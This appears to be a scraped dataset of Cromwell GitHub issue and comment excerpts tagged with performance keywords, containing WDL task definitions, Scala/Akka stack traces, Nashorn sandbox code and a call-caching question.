sampleSetTest.txt: ; [SampleSetTest.txt](https://github.com/broadinstitute/cromwell/files/694627/SampleSetTest.txt). All of the individual tasks seem to work, but when it begins the scatter it fails to start most of the tasks. I don't see a pattern to which it seems to start. It then reports QueuedInCromwell on the started tasks, even though they seem to have finished with output. This fails **both** in SGE and Local backends. There is a suspicion that this might be due to declaring variables inside of the scatter? I'm going to try extracting all variable declaration into a task to see if that works.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1826:3878,Queue,QueuedInCromwell,3878,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1826,1,['Queue'],['QueuedInCromwell']
Performance,"${mem}g -jar ${gatk_jar} AnnotateTargets --targets ${target_file} --reference ${ref_fasta} --output ${entity_id}.annotated.tsv; \; else touch ${entity_id}.annotated.tsv; \; fi; }. output {; File annotated_targets = ""${entity_id}.annotated.tsv""; }; }. # Correct coverage for sample-specific GC bias effects; # Note that this task is optional ; task CorrectGCBias {; String entity_id; File coverage_file; File annotated_targets; String gatk_jar; Boolean enable_gc_correction; Int mem. # If GC correction is disabled, then the coverage file gets passed downstream unchanged; command {; if [ ${enable_gc_correction} = true ]; \; then java -Xmx${mem}g -jar ${gatk_jar} CorrectGCBias --input ${coverage_file} \; --output ${entity_id}.gc_corrected_coverage.tsv --targets ${annotated_targets}; \; else cp ${coverage_file} ${entity_id}.gc_corrected_coverage.tsv; \; fi; }. output {; File gatk_cnv_coverage_file_gcbias = ""${entity_id}.gc_corrected_coverage.tsv""; }; }. # Perform tangent normalization (noise reduction) on the proportional coverage file.; task NormalizeSomaticReadCounts {; String entity_id; File coverage_file; File padded_target_file; File pon; String gatk_jar; Int mem. command {; java -Xmx${mem}g -jar ${gatk_jar} NormalizeSomaticReadCounts --input ${coverage_file} \; --targets ${padded_target_file} --panelOfNormals ${pon} --factorNormalizedOutput ${entity_id}.fnt.tsv --tangentNormalized ${entity_id}.tn.tsv \; --betaHatsOutput ${entity_id}.betaHats.tsv --preTangentNormalized ${entity_id}.preTN.tsv --help false --version false --verbosity INFO --QUIET false; }. output {; File tn_file = ""${entity_id}.tn.tsv""; File pre_tn_file = ""${entity_id}.preTN.tsv""; File betahats_file = ""${entity_id}.betaHats.tsv""; }; #runtime {; # docker: ""gatk-protected/a1""; #}; }. # Segment the tangent normalized coverage profile.; task PerformSegmentation {; String entity_id; Float seg_param_alpha; Int seg_param_nperm; String seg_param_pmethod; Int seg_param_minWidth; Int seg_param_kmax; Int seg_param_nm",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1488#issuecomment-249696151:13381,Perform,Perform,13381,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1488#issuecomment-249696151,1,['Perform'],['Perform']
Performance,"())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$validateWdlNamespace$13(MaterializeWorkflowDescriptorActor.scala:491),List())WorkflowFailure(scala.util.Either.flatMap(Either.scala:338),List())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.validateWdlNamespace(MaterializeWorkflowDescriptorActor.scala:490),List())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$materialization$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:231),List())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:157),List())WorkflowFailure(scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:304),List())WorkflowFailure(scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37),List())WorkflowFailure(scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60),List())WorkflowFailure(akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55),List())WorkflowFailure(akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91),List())WorkflowFailure(scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12),List())WorkflowFailure(scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81),List())WorkflowFailure(akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91),List())WorkflowFailure(akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40),List())WorkflowFailure(akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43),List())WorkflowFailure(akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260),List())WorkflowFailure(akka.dispatch.forkjoin.F",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3176:2473,concurren,concurrent,2473,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3176,1,['concurren'],['concurrent']
Performance,(MapLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.ja,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618:5321,concurren,concurrent,5321,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618,1,['concurren'],['concurrent']
Performance,(Native Method); - parking to wait for <0x00000006c0060ab0> (a java.util.concurrent.CountDownLatch$Sync); at java.util.concurrent.locks.LockSupport.park(Redefined); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:997); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1304); at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:231); at akka.actor.ActorSystemImpl$TerminationCallbacks.ready(Redefined); at akka.actor.ActorSystemImpl$TerminationCallbacks.ready(Redefined); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.impl.ExecutionContextImpl$DefaultThreadFactory$$anon$2$$anon$4.block(ExecutionContextImpl.scala); at scala.concurrent.forkjoin.ForkJoinPool.managedBlock(Redefined); at scala.concurrent.impl.ExecutionContextImpl$DefaultThreadFactory$$anon$2.blockOn(ExecutionContextImpl.scala:44); at scala.concurrent.Await$.ready(package.scala:169); at akka.actor.ActorSystemImpl.awaitTermination(ActorSystem.scala); at akka.actor.ActorSystemImpl.awaitTermination(ActorSystem.scala); at cromwell.server.CromwellServer$$anonfun$run$1.applyOrElse(CromwellServer.scala:29); at cromwell.server.CromwellServer$$anonfun$run$1.applyOrElse(CromwellServer.scala); at scala.concurrent.Future$$anonfun$andThen$1.apply(Future.scala:433); at scala.concurrent.Future$$anonfun$andThen$1.apply(Future.scala); at scala.concurrent.impl.CallbackRunnable.run(Redefined); at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java); at scala.concurrent.forkjoin.F,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:45471,concurren,concurrent,45471,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,(SqlJobStore.scala:66) ~[classes/:na]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.util.Try$.apply(Try.scala:192) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.util.Success.map(Try.scala:237) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[scala-library-2.11.7.jar:na]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[scala-library-2.11.7.jar:na]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32) ~[scala-library-2.11.7.jar:na]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72) ~[scala-library-2.11.7.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [akka-actor_2.11-2.3.15.jar:na]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [scala-library-2.11.7.jar:na]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [scala-library-2.11.7.jar:na]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [scala-library-2.11.7.jar:na]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [scala-library-2.11.7.jar:na]; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1349#issuecomment-242840472:3274,concurren,concurrent,3274,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1349#issuecomment-242840472,5,['concurren'],['concurrent']
Performance,"(TestFramework.scala:246) at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282) at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282) at sbt.TestFunction.apply(TestFramework.scala:294) at sbt.Tests$.processRunnable$1(Tests.scala:347) at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353) at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46) at sbt.std.Transform$$anon$4.work(System.scala:67) at sbt.Execute.$anonfun$submit$2(Execute.scala:269) at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16) at sbt.Execute.work(Execute.scala:278) at sbt.Execute.$anonfun$submit$1(Execute.scala:269) at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178) at sbt.CompletionService$$anon$2.call(CompletionService.scala:37) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) Cause: akka.pattern.AskTimeoutException: Ask timed out on [Actor[akka://test-system-6/user/$l#-102797778]] after [30000 ms]. Sender[Actor[akka://test-system-6/system/testActor-24#-1294021439]] sent message of type ""cromwell.engine.workflow.SingleWorkflowRunnerActor$RunWorkflow$"". at akka.pattern.PromiseActorRef$.$anonfun$defaultOnTimeout$1(AskSupport.scala:596) at akka.pattern.PromiseActorRef$.$anonfun$apply$1(AskSupport.scala:606) at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205) at scala.concurrent.Future$InternalCallbackExecutor$.unbatchedExecute(Future.scala:870) at scala.concurrent.BatchingExecutor.execute(BatchingExecutor.scala:109) at scala.concurrent.BatchingExecutor.execute$(BatchingExecutor.scala:103) at scala.concurrent.Futu",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4350:5994,concurren,concurrent,5994,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4350,1,['concurren'],['concurrent']
Performance,"(ToL, of course). I _still_ don't always know where to draw the line between creating a new `akka..Actor` and using a `scala..Future`. Something does ""smell"" funny though about the way we:; - Queue of things-to-do is on the `ec: ExecutionContext`; - A mailbox `message: AnyRef` is received off the `ec` by the dispatcher and passed to our `actor: Actor`.; - Instead of running a `runnable: Runnable` bit of code immediately, the `actor` chooses to throws the `runnable` onto the back of the `ec` queue and then say ""done processing `message`"". That said, [this blog](https://www.chrisstucchio.com/blog/2013/actors_vs_futures.html) seems to say that `Actor` and `Future` can work together, but maybe something is off about how we're composing them in our `BackendLifecycleActor` interfaces.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1010#issuecomment-226573034:192,Queue,Queue,192,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1010#issuecomment-226573034,2,"['Queue', 'queue']","['Queue', 'queue']"
Performance,(TraversableLike.scala:777) ~[cromwell.jar:0.19]; at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.j,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618:5223,concurren,concurrent,5223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618,1,['concurren'],['concurrent']
Performance,(WdlDraft3LanguageFactory.scala:50); languages.wdl.draft3.WdlDraft3LanguageFactory.$anonfun$validateNamespace$2(WdlDraft3LanguageFactory.scala:39); scala.util.Either.flatMap(Either.scala:338); languages.wdl.draft3.WdlDraft3LanguageFactory.validateNamespace(WdlDraft3LanguageFactory.scala:38); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$buildWorkflowDescriptor$7(MaterializeWorkflowDescriptorActor.scala:242); cats.data.EitherT.$anonfun$flatMap$1(EitherT.scala:80); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:128); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 	at cromwell.e,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:9404,concurren,concurrent,9404,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['concurren'],['concurrent']
Performance,(WdlDraft3LanguageFactory.scala:50); languages.wdl.draft3.WdlDraft3LanguageFactory.$anonfun$validateNamespace$2(WdlDraft3LanguageFactory.scala:39); scala.util.Either.flatMap(Either.scala:338); languages.wdl.draft3.WdlDraft3LanguageFactory.validateNamespace(WdlDraft3LanguageFactory.scala:38); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$buildWorkflowDescriptor$7(MaterializeWorkflowDescriptorActor.scala:242); cats.data.EitherT.$anonfun$flatMap$1(EitherT.scala:80); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:138); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:269); cats.effect.IO.unsafeToFuture(IO.scala:341); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 	at cromwell.e,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6999:12228,concurren,concurrent,12228,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6999,1,['concurren'],['concurrent']
Performance,(during InitializingWorkflowState): Failed to upload authentication file; java.io.IOException: Failed to upload authentication file; 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$beforeAll$1.applyOrElse(JesInitializationActor.scala:63); 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$beforeAll$1.applyOrElse(JesInitializationActor.scala:62); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: cromwell.core.CromwellFatalException: com.google.cloud.storage.StorageException: Connection has been shutdown: javax.net.ssl.SSLException: java.net.SocketException: Broken pipe; 	at cromwell.core.CromwellFatalException$.apply(core.scala:17); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:37); 	at cromwell.core.retry.Retry$$an,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2183:1277,concurren,concurrent,1277,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2183,1,['concurren'],['concurrent']
Performance,"(expr, context);; }. private static final NashornScriptEngineFactory ENGINE_FACTORY = new NashornScriptEngineFactory();. /**; * Add stricter Nashorn arguments to the default `-doe`.; *; * @see <a href=""https://docs.oracle.com/javase/8/docs/technotes/tools/windows/jjs.html"">JJS docs and options</a>; * @see <a href=""https://github.com/JetBrains/jdk8u_nashorn/blob/jdk8u76-b03/src/jdk/nashorn/internal/runtime/resources/Options.properties"">Nashorn supported options (github) </a>; * @see <a href=""http://hg.openjdk.java.net/jdk8/jdk8/nashorn/file/5dbdae28a6f3/src/jdk/nashorn/internal/runtime/resources/Options.properties"">Nashorn supported options</a>; * @see jdk.nashorn.api.scripting.NashornScriptEngineFactory#DEFAULT_OPTIONS; */; private static String[] nashornStrictArgs = {; ""-doe"", ""-strict"", ""--no-java"", ""--no-syntax-extensions"", ""--language=es5""; };. /**; * Don't allow any java classes.; */; private static ClassFilter noJavaClassFilter = anyClass -> false;. /**; * Copy/paste of the private jdk.nashorn.api.scripting.NashornScriptEngineFactory#getAppClassLoader().; * Of all the overloads of jdk.nashorn.api.scripting.NashornScriptEngineFactory#getScriptEngine, there is no jdk8; * one that receives just args and a class filter.; *; * @see jdk.nashorn.api.scripting.NashornScriptEngineFactory#getScriptEngine; * @see jdk.nashorn.api.scripting.NashornScriptEngineFactory#getAppClassLoader; */; private static ClassLoader getNashornClassLoader() {; // Revisit: script engine implementation needs the capability to; // find the class loader of the context in which the script engine; // is running so that classes will be found and loaded properly; final ClassLoader ccl = Thread.currentThread().getContextClassLoader();; return (ccl == null) ? NashornScriptEngineFactory.class.getClassLoader() : ccl;; }. private static final String LINE_SEPARATOR = System.getProperty(""line.separator"");. private static String expr(String... lines) {; return String.join(LINE_SEPARATOR, lines);; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3090#issuecomment-355634573:12639,load,loader,12639,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3090#issuecomment-355634573,2,['load'],"['loaded', 'loader']"
Performance,") is set to ""soft-link"".; - `path+modtime` - compute an md5 hash of the file path and the last modified time. The same conditions as for ""path"" apply here. [Code: `md5Hex(file.toAbsolutePath.pathAsString + file.lastModifiedTime.toString)`]. Other caching options:. - `system.file-hash-cache` - Prevent repeatedly requesting the hashes of the same files multiple times. - `backend.providers.Local.caching.check-sibling-md5` - will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash. ## My takeaway. - I can't use a `softlink` cache duplication strategy as it's not allowed for containers. - If I select the `path+modtime` hashing strategy, only the first task in a workflow will succeed, as the hard-link duplication strategy will cause the path ""absolute"" be different (causing a hash differential). ## Questions. - ~What defines a cache hit, or exactly which information is used to the call hash?~; > I'll answer this one myself, by looking at the metadata returned from `/api/workflows/{version}/{id}/metadata`, within the `calls.$yourstepname.callCaching`, the hashes field has the following attributes:; > - `output count`; > - `runtime attribute`; > - `output expression`; > - `input count`; > - `backend name`; > - `command template`; > - `input`. - ~When does the command section get hashed (before or after replacements)?~; > The template gets cached. - ~What other elements go into the building the cache?~; > output count, runtime attribute, output expression, input count, backend name, command template, input. - What are the downsides with `check-sibling-md5`, can it be used in conjunction with `system.file-hash-cache`. - **Is the only way to use call-caching with containers without fully hashing the file?**. ## Possible resolutions. I was thinking the following might be potential solutions for my problem, but I don't know how good / bad they are, and they'd require changes to Cromwell. - Potential for ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346:2451,cache,cache,2451,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346,1,['cache'],['cache']
